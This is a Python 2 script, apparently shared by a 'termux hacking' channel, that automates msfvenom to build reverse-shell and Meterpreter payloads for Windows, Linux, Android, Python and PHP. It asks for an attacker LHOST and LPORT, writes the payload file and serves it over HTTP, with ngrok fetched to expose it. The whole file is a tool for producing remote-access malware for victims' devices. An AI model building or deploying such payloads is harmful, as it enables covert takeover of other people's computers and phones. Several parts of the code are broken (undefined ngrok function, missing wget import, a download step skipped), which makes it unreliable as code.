#!/usr/bin/python
#-*- coding: utf-8 -*-
#Author      *ERR0R*
#YouTube     @termux_hacking
#Telegram    termuxxhacking
#AUTOMATIC TERMUX MSFVENOM EXPLOIT

import os, platform
from SimpleHTTPServer import test
from sys import exit
from time import sleep

red= '\033[1;91m'
orange= '\33[38;5;198m'
green= '\033[1;92m'
cyan= '\033[1;96m'
white= "\033[1;97m"
purple= "\033[1;95m"
blue= "\033[1;94m"
bold= '\033[1m'
end= '\033[0m'

def head():
    os.system('clear')
    print '''\033[1;92m

	       ╔═╗┬ ┬┌┬┐┌─┐┌┬┐┌─┐┌┬┐┬┌─┐
               ╠═╣│ │ │ │ ││││├─┤ │ ││  
	       ╩ ╩└─┘ ┴ └─┘┴ ┴┴ ┴ ┴ ┴└─┘

	\033[1;97m         ╔╦╗┌─┐┬─┐┌┬┐┬ ┬─┐ ┬      
	          ║ ├┤ ├┬┘││││ │┌┴┬┘      
	          ╩ └─┘┴└─┴ ┴└─┘┴ └─      

	\033[1;91m       ╔╦╗╔═╗╔═╗┬  ┬┌─┐┌┐┌┌─┐┌┬┐
	       ║║║╚═╗╠╣ └┐┌┘├┤ ││││ ││││
	       ╩ ╩╚═╝╚   └┘ └─┘┘└┘└─┘┴ ┴

	\033[1;95m         ╔═╗─┐ ┬┌─┐┬  ┌─┐┬┌┬┐     
	         ║╣ ┌┴┬┘├─┘│  │ ││ │      
	         ╚═╝┴ └─┴  ┴─┘└─┘┴ ┴      


\033[1;95m*+*+*+*+*+*+*+*+*+*+*+*\033[1;97mFollow Us:\033[1;95m*+*+*+*+*+*+*+*+*+*+*+*


\033[1;97m• \033[1;92mGitHub    : \033[1;91mhttps://github.com/Err0-ICA
\033[1;97m• \033[1;96mTelegram  : \033[1;94mhttps://t.me/termuxxhacking
\033[1;97m• \033[1;93mTeam      : \033[1;92mITALIA \033[1;97mCYBER \033[1;91mARMY
\033[1;97m• \033[1;91mInstagram : \033[1;90m@termux_hacking

\033[1;95m*+*+*+*+*+*+*+*+*+*+*+*+*\033[1;97mATMSFE\033[1;95m*+*+*+*+*+*+*+*+*+*+*+*+*

\033[1;92m'''

def finish():
    head()
    print('{0}Until Next Time...{1}').format(green, end)
    exit(0)

def present():
    if os.path.isfile('/data/data/com.termux/files/usr/bin/msfconsole') == False:
        print('{0}Failed to Locate msfvenom. Make Sure Metasploit-Framework is Installed Correctly And Try Again.{1}').format(red, end)
        exit(0)
    if os.path.isdir('output') == False:
        head()
        print('{0}Creating Output Directory{1}').format(green, end)
        os.makedirs('output')
        sleep(1)
    if os.path.isfile('ngrok') == False:
        head()
        print("{0}Downloading Ngrok...{1}").format(green, end)
        if platform.architecture == "32bit":
            wget.download('https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.tgz')
            os.system('tar -xf ngrok-stable-linux-386.tgz')
            os.system('rm ngrok-stable-linux-386.tgz')
        else:
            os.system('tar -xf ngrok-stable-linux-amd64.tgz')
            os.system('rm ngrok-stable-linux-amd64.tgz')

def server():
    os.system('cd output/ && python -m SimpleHTTPServer 80')

def main(platform, type):
    lhost = raw_input("\nEnter Your LHOST\n{0}{1}root@ATMSFE -->>> /LHOST#{2} ".format(green, bold, end))
    print ("")
    lport = raw_input("\nEnter Your LPORT\n{0}{1}root@ATMSFE -->>> /LPORT#{2} ".format(green, bold, end))
    print ("")
    output = raw_input("\nEnter The Name of Output File\n{0}{1}root@ATMSFE -->>> /output#{2} ".format(green, bold, end))
    #Windows
    if platform == 'Windows' and type == '1':
        payload= 'windows/meterpreter/reverse_http'
        format= 'exe'
        extension= '.exe'
    if platform == 'Windows' and type == '2':
        payload= 'windows/meterpreter/reverse_https'
        format= 'exe'
        extension= '.exe'
    if platform == 'Windows' and type == '3':
        payload= 'windows/meterpreter/reverse_tcp'
        format= 'exe'
        extension= '.exe'
    #linux
    if platform == 'Linux' and type == '1':
        payload= 'linux/x86/shell/reverse_tcp'
        format= 'elf'
        extension= '.elf'
    if platform == 'Linux' and type == '2':
        payload= 'linux/x86/meterpreter/reverse_tcp'
        format= 'elf'
        extension= '.elf'
    #Android
    elif platform == 'Android' and type == '1':
        payload= 'android/meterpreter/reverse_http'
        format= 'raw'
        extension= '.apk'
    elif platform == 'Android' and type == '2':
        payload= 'android/meterpreter/reverse_https'
        format= 'raw'
        extension= '.apk'
    elif platform == 'Android' and type == '3':
        payload= 'android/meterpreter/reverse_tcp'
        format= 'raw'
        extension= '.apk'
    #Python
    elif platform == 'Python' and type == '1':
        payload= 'python/meterpreter/reverse_http'
        format= 'raw'
        extension= '.py'
    elif platform == 'Python' and type == '2':
        payload= 'python/meterpreter/reverse_https'
        format= 'raw'
        extension= '.py'
    elif platform == 'Python' and type == '3':
        payload= 'python/meterpreter/reverse_tcp'
        format= 'raw'
        extension= '.py'
    #PHP
    elif platform == 'PHP' and type == '1':
        payload= 'php/meterpreter/reverse_tcp'
        format= 'raw'
        extension= '.php'
    os.system('msfvenom -p '+payload+' LHOST='+lhost+' LPORT='+lport+' -f'+format+' -o output/'+output+extension)
    sleep(3)
    if os.path.isfile('output/'+output+extension) == False:
        head()
        raw_input('{2}Failed to Create Payload, Please Try Again.{1} {0}(Hit Enter to Continue){1}'.format(bold, end, red))
        choosepayload()
       
def choosepayload():
    head()
    select = raw_input('{2}Choose a payload platform:{1}\n\n{0}[{1}1{0}]{1} Windows\n{0}[{1}2{0}]{1} Linux\n{0}[{1}3{0}]{1} Android\n{0}[{1}4{0}]{1} Python\n{0}[{1}5{0}]{1} PHP\n{0}[{1}0{0}]{1} Exit\n\n{0}{2}root@ATMSFE -->>>{1} '.format(green, end, bold))
    if select == '1':
        head()
        type = raw_input('{2}Choose a payload type:{1}\n\n{0}[{1}1{0}]{1} windows/meterpreter/reverse_http\n{0}[{1}2{0}]{1} windows/meterpreter/reverse_https\n{0}[{1}3{0}]{1} windows/meterpreter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}root@ATMSFE -->>>/Windows#{1} '.format(green, end, bold))
        if type == '0':
            choosepayload()
        main('Windows', type)
    elif select == '2':
        head()
        type = raw_input('{2}Choose a Payload type:{1}\n\n{0}[{1}1{0}]{1} linux/x86/shell/reverse_tcp\n{0}[{1}2{0}]{1} linux/x86/meterpreter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}root@ATMSFE -->>>/Linux#{1} '.format(green, end, bold))
        if type == '0':
            choosepayload()
        main('Linux', type)
    elif select == '3':
        head()
        type = raw_input('{2}Choose a Payload type:{1}\n\n{0}[{1}1{0}]{1} android/meterpreter/reverse_http\n{0}[{1}2{0}]{1} android/meterpreter/reverse_https\n{0}[{1}3{0}]{1} android/meterpreter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}root@ATMSFE -->>>/Android#{1} '.format(green, end, bold))
        if type == '0':
            choosepayload()
        main('Android', type)
    elif select == '4':
        head()
        type = raw_input('{2}Choose a Payload type:{1}\n\n{0}[{1}1{0}]{1} python/meterpreter/reverse_http\n{0}[{1}2{0}]{1} python/meterpreter/reverse_https\n{0}[{1}3{0}]{1} python/meterpreter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}root@ATMSFE -->>>/Python#{1} '.format(green, end, bold))
        if type == '0':
            choosepayload()
        main('Python', type)
    elif select == '5':
        head()
        type = raw_input('{2}Choose a Payload type:{1}\n\n{0}[{1}1{0}]{1} php/meterprter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}root@ATMSFE -->>>/PHP#{1} '.format(green, end, bold))
        if type == '0':
            choosepayload()
        main('PHP', type)
    elif select == '6':
        ngrok()
    elif select == '0':
        finish()
    else:
        head()
        print('{0}Please Select a Valid Option.{1}').format(red, end)
        sleep(2)
        choosepayload()

if __name__ == "__main__":
    try:
        head()
        present()
        choosepayload()
    except KeyboardInterrupt:
        finish()
